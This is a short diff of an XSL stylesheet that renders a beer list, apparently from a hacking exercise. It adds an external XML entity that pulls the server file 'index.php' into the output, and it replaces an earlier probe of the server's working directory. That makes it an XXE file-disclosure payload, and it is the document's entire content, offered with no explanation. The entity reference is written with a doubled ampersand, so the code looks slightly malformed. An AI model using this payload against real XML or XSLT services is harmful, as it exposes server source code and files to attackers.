@@ -1,8 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE expl [
+   <!ENTITY indx SYSTEM "index.php">
+]>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
    =========================
-<xsl:value-of select="system-property('user.dir')"/>
+&&indx;
    =========================
 <xsl:for-each select="beers/beer">
   <div style="background-color:teal;color:white;padding:4px">
